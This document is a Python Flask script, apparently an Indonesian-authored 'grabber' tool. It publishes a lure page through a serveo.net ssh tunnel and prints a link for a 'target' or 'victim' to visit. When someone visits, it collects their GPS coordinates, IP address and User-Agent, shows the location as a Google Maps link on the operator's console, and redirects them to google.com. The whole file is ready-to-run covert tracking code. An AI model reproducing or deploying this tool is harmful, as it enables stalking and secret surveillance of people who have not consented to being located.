from flask import Flask, render_template, request
from colorama import init, Fore, Style
from termcolor import colored
import logging
import os
import sys
import contextlib
import time
import pexpect
import re
import threading

init(autoreset=True)

# set the colors
os.system("clear")
ports = int(input(Fore.YELLOW + "Enter port for display your URL: " + Fore.WHITE))

app = Flask(__name__)

class NullHandler(logging.Handler):
    def emit(self, record):
        pass

log = logging.getLogger('werkzeug')
log.addHandler(NullHandler())
log.propagate = False

sys.stdout = open(os.devnull, 'w')
sys.stderr = open(os.devnull, 'w')

@app.route('/')
def index():
    return render_template("index.html")

@app.route('/location', methods=['POST'])
def location():
    lat = request.form.get('lat')
    lon = request.form.get('lon')
    accuracy = request.form.get('accuracy')
    
    ip = request.remote_addr
    ua = request.headers.get("User-Agent")
    
    original_url = "https://www.google.com"
    with contextlib.redirect_stdout(sys.__stdout__):
        print(colored("\nGRABBER SUCCESS", "green","on_red"))
        print(f"\n{Fore.YELLOW}IP : {Fore.WHITE}{ip}\n{Fore.YELLOW}User-Agent : {Fore.WHITE}{ua}\n{Fore.YELLOW}Location: {Fore.WHITE}https://maps.google.com/?q={lat},{lon}")
        return original_url

def start_serveo_session(port):
    command = f"ssh -o ServerAliveInterval=60 -R 80:localhost:{port} serveo.net"
    child = pexpect.spawn(command)

    try:
        # Cari URL dari output
        child.expect(r'Forwarding HTTP traffic from https://\S+', timeout=30)
        output = child.after.decode()

        # Ekstrak URL dengan regex
        match = re.search(r'https://\S+', output)
        if match:
            serveo_url = match.group(0)
            print(colored("\nWAITING TARGET VISIT THIS LINK","green","on_red"))
            print(f"{Fore.YELLOW}Serveo URL: {Fore.WHITE}{serveo_url}")
            # Simpan URL ke dalam file
            with open('serveo_url.txt', 'w') as file:
                file.write(serveo_url)
        else:
            print("URL Serveo tidak ditemukan.")
        
        # Tetap aktifkan sesi SSH
        child.expect(pexpect.EOF, timeout=None)
    except pexpect.TIMEOUT:
        print("Timeout saat mencoba menangkap URL Serveo.")
    except pexpect.EOF:
        print("Sesi SSH selesai.")
    finally:
        child.close()

def run_serveo_in_background(port):
    thread = threading.Thread(target=start_serveo_session, args=(port,))
    thread.daemon = True
    thread.start()

if __name__ == '__main__':

    with contextlib.redirect_stdout(sys.__stdout__):
        run_serveo_in_background(ports)
        time.sleep(5)  # Tunggu beberapa detik agar sesi SSH bisa dimulai dan URL diambil
    
    with open('serveo_url.txt', 'r') as file:
        serveo_url = file.read().strip()
        #print(f"Victim URL: {serveo_url}")

    with open(os.devnull, 'w') as f, contextlib.redirect_stdout(f), contextlib.redirect_stderr(f):
        app.run(host='0.0.0.0', port=ports, debug=False)